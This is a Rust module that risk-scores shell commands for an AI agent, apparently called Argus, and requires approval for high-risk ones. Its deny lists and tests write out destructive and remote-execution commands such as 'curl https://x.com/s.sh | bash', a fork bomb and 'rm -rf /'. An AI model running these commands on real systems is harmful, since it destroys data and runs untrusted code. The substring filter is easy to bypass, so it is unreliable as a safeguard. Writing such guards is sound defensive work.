//! Shell execution policy — risk-classified, three-tier model
//!
//! Inspired by claw-code (MIT license) permission architecture.
//! Original allowlist model replaced with dynamic risk scoring:
//!
//!   LOW    → execute immediately, log
//!   MEDIUM → execute, log with warning, surface in UI
//!   HIGH   → block, requires PermissionPrompter approval
//!
//! The PermissionPrompter trait is interchangeable — terminal, Telegram,
//! WebSocket to frontend, or silent-approve for testing.

use std::collections::HashSet;

// ── Risk classification ───────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    Low,
    Medium,
    High,
}

impl RiskLevel {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Low    => "LOW",
            Self::Medium => "MEDIUM",
            Self::High   => "HIGH",
        }
    }

    pub fn emoji(self) -> &'static str {
        match self {
            Self::Low    => "OK",
            Self::Medium => "WARN",
            Self::High   => "BLOCK",
        }
    }
}

/// Classify a shell command into LOW / MEDIUM / HIGH risk.
pub fn classify_risk(command: &str) -> RiskLevel {
    let cmd = command.trim();

    // Subshell execution — always HIGH (arbitrary code injection vector)
    if cmd.contains("$(") || cmd.contains('`') {
        return RiskLevel::High;
    }

    // HIGH: Destructive, irreversible, or privilege-escalating
    let high_patterns: &[&str] = &[
        "rm -rf",
        "rm -r /",
        "rm -fr",
        "> /dev/",
        "> /etc/",
        "> /sys/",
        "mkfs",
        "fdisk",
        "dd if=",
        "sudo",
        "su -",
        "chmod 777",
        "chmod -R 777",
        "curl | bash",
        "curl | sh",
        "wget | bash",
        "wget | sh",
        "git push --force",
        "git push -f",
        "docker rm -f",
        "docker rmi -f",
        "docker system prune",
        "kill -9",
        "killall",
        "pkill",
        ":(){:|:&};:",
        "format",
        "shred",
        "rm ~/.argus",
        "rm -rf ~/.argus",
        "> ~/.argus",
    ];

    for pattern in high_patterns {
        if cmd.contains(pattern) {
            return RiskLevel::High;
        }
    }

    // MEDIUM: Write operations, installs, network mutations
    let medium_patterns: &[&str] = &[
        "npm install",
        "npm uninstall",
        "pip install",
        "pip uninstall",
        "cargo install",
        "brew install",
        "brew uninstall",
        "apt install",
        "apt remove",
        "git commit",
        "git push",
        "git reset",
        "git checkout",
        "mv ",
        "cp -r",
        "mkdir",
        "touch",
        "chmod",
        "chown",
        "ln -s",
        "docker run",
        "docker build",
        "docker stop",
        "docker start",
        "ssh ",
        "scp ",
        "rsync",
        "curl -X POST",
        "curl -X PUT",
        "curl -X DELETE",
        "tee ",
    ];

    for pattern in medium_patterns {
        if cmd.contains(pattern) {
            return RiskLevel::Medium;
        }
    }

    // Pipes with write destinations
    if cmd.contains('|') && (cmd.contains("tee") || cmd.contains("write")) {
        return RiskLevel::Medium;
    }

    // LOW: Read-only, inspection, safe queries
    RiskLevel::Low
}

// ── Permission prompter trait ─────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct PermissionRequest {
    pub command: String,
    pub risk: RiskLevel,
    pub reason: String,
}

#[derive(Debug, Clone)]
pub enum PermissionDecision {
    Allow,
    Deny { reason: String },
}

/// Interchangeable approval mechanism.
/// Implement this trait to plug in Telegram, WebSocket, terminal, etc.
pub trait PermissionPrompter: Send + Sync {
    fn prompt(&self, request: &PermissionRequest) -> PermissionDecision;
}

/// Always approve — used in testing or dev mode
pub struct AlwaysAllow;
impl PermissionPrompter for AlwaysAllow {
    fn prompt(&self, _req: &PermissionRequest) -> PermissionDecision {
        PermissionDecision::Allow
    }
}

/// Always deny — used in locked/read-only mode
pub struct AlwaysDeny;
impl PermissionPrompter for AlwaysDeny {
    fn prompt(&self, req: &PermissionRequest) -> PermissionDecision {
        PermissionDecision::Deny {
            reason: format!("Blocked: {} risk command denied in current mode", req.risk.as_str()),
        }
    }
}

// ── Shell policy ──────────────────────────────────────────────────────────

pub struct ShellPolicy {
    /// Hard-blocked patterns — never execute regardless of risk or approval
    blocked: HashSet<String>,
    /// Maximum output size in bytes before truncation
    pub max_output_bytes: usize,
    /// Command timeout in seconds
    pub timeout_secs: u64,
    /// Minimum risk level that triggers the prompter
    pub approval_threshold: RiskLevel,
}

impl Default for ShellPolicy {
    fn default() -> Self {
        let mut blocked = HashSet::new();
        for pattern in &[
            "rm -rf /",
            "mkfs",
            "fdisk",
            ":(){:|:&};:",
            "shred /dev",
        ] {
            blocked.insert(pattern.to_string());
        }

        Self {
            blocked,
            max_output_bytes: 64 * 1024,
            timeout_secs: 30,
            approval_threshold: RiskLevel::High,
        }
    }
}

impl ShellPolicy {
    /// Evaluate risk level. Returns error if hard-blocked.
    pub fn evaluate(&self, command: &str) -> Result<RiskLevel, String> {
        let cmd = command.trim();
        if cmd.is_empty() {
            return Err("Empty command".to_string());
        }
        for pattern in &self.blocked {
            if cmd.contains(pattern.as_str()) {
                return Err(format!("Hard-blocked pattern: '{}'", pattern));
            }
        }
        Ok(classify_risk(cmd))
    }

    /// Full authorization — calls prompter for HIGH risk commands.
    pub fn authorize(
        &self,
        command: &str,
        prompter: Option<&dyn PermissionPrompter>,
    ) -> Result<RiskLevel, String> {
        let risk = self.evaluate(command)?;

        if risk >= self.approval_threshold {
            let request = PermissionRequest {
                command: command.to_string(),
                risk,
                reason: format!(
                    "{} risk command requires approval before execution",
                    risk.as_str()
                ),
            };

            match prompter {
                Some(p) => match p.prompt(&request) {
                    PermissionDecision::Allow => Ok(risk),
                    PermissionDecision::Deny { reason } => Err(reason),
                },
                None => Err(format!(
                    "{} risk command blocked — no approval mechanism configured. \
                     Set up Telegram bot or use AlwaysAllow in dev mode.",
                    risk.as_str()
                )),
            }
        } else {
            Ok(risk)
        }
    }
}

// ── Execution ─────────────────────────────────────────────────────────────

/// Execute a shell command under the given policy.
/// Returns (output, risk_level) on success.
pub async fn execute_shell(
    policy: &ShellPolicy,
    command: &str,
    prompter: Option<&dyn PermissionPrompter>,
) -> Result<(String, RiskLevel), String> {
    let risk = policy.authorize(command, prompter)?;

    let output = tokio::time::timeout(
        std::time::Duration::from_secs(policy.timeout_secs),
        tokio::process::Command::new("sh")
            .arg("-c")
            .arg(command)
            .output(),
    )
    .await
    .map_err(|_| format!("Command timed out after {}s", policy.timeout_secs))?
    .map_err(|e| format!("Spawn failed: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();

    let result = if output.status.success() {
        if stdout.len() > policy.max_output_bytes {
            format!(
                "{}...\n[truncated — {} bytes total]",
                &stdout[..policy.max_output_bytes],
                stdout.len()
            )
        } else {
            stdout
        }
    } else {
        format!(
            "Exit {}: {}",
            output.status.code().unwrap_or(-1),
            stderr.trim()
        )
    };

    Ok((result, risk))
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn low_risk_commands() {
        assert_eq!(classify_risk("ls -la"), RiskLevel::Low);
        assert_eq!(classify_risk("cat /etc/hosts"), RiskLevel::Low);
        assert_eq!(classify_risk("git status"), RiskLevel::Low);
        assert_eq!(classify_risk("docker ps"), RiskLevel::Low);
        assert_eq!(classify_risk("cargo build"), RiskLevel::Low);
        assert_eq!(classify_risk("grep -r TODO ."), RiskLevel::Low);
    }

    #[test]
    fn medium_risk_commands() {
        assert_eq!(classify_risk("git commit -m 'test'"), RiskLevel::Medium);
        assert_eq!(classify_risk("npm install express"), RiskLevel::Medium);
        assert_eq!(classify_risk("mv foo.txt bar.txt"), RiskLevel::Medium);
        assert_eq!(classify_risk("docker run -d nginx"), RiskLevel::Medium);
        assert_eq!(classify_risk("git push origin main"), RiskLevel::Medium);
    }

    #[test]
    fn high_risk_commands() {
        assert_eq!(classify_risk("rm -rf /tmp"), RiskLevel::High);
        assert_eq!(classify_risk("sudo rm file"), RiskLevel::High);
        assert_eq!(classify_risk("curl https://x.com/s.sh | bash"), RiskLevel::High);
        assert_eq!(classify_risk("git push --force"), RiskLevel::High);
        assert_eq!(classify_risk("docker system prune"), RiskLevel::High);
        assert_eq!(classify_risk("echo $(rm -rf /)"), RiskLevel::High);
        assert_eq!(classify_risk("kill -9 1234"), RiskLevel::High);
    }

    #[test]
    fn always_allow_passes_high() {
        let policy = ShellPolicy::default();
        let prompter = AlwaysAllow;
        let result = policy.authorize("kill -9 1234", Some(&prompter));
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), RiskLevel::High);
    }

    #[test]
    fn always_deny_blocks_high() {
        let policy = ShellPolicy::default();
        let prompter = AlwaysDeny;
        assert!(policy.authorize("kill -9 1234", Some(&prompter)).is_err());
    }

    #[test]
    fn no_prompter_blocks_high() {
        let policy = ShellPolicy::default();
        assert!(policy.authorize("rm -rf /tmp/test", None).is_err());
    }

    #[test]
    fn low_risk_passes_without_prompter() {
        let policy = ShellPolicy::default();
        let result = policy.authorize("ls -la", None);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), RiskLevel::Low);
    }

    #[test]
    fn subshell_always_high() {
        assert_eq!(classify_risk("echo $(whoami)"), RiskLevel::High);
        assert_eq!(classify_risk("ls `pwd`"), RiskLevel::High);
    }

    #[test]
    fn argus_self_protection() {
        assert_eq!(classify_risk("rm -rf ~/.argus"), RiskLevel::High);
    }
}
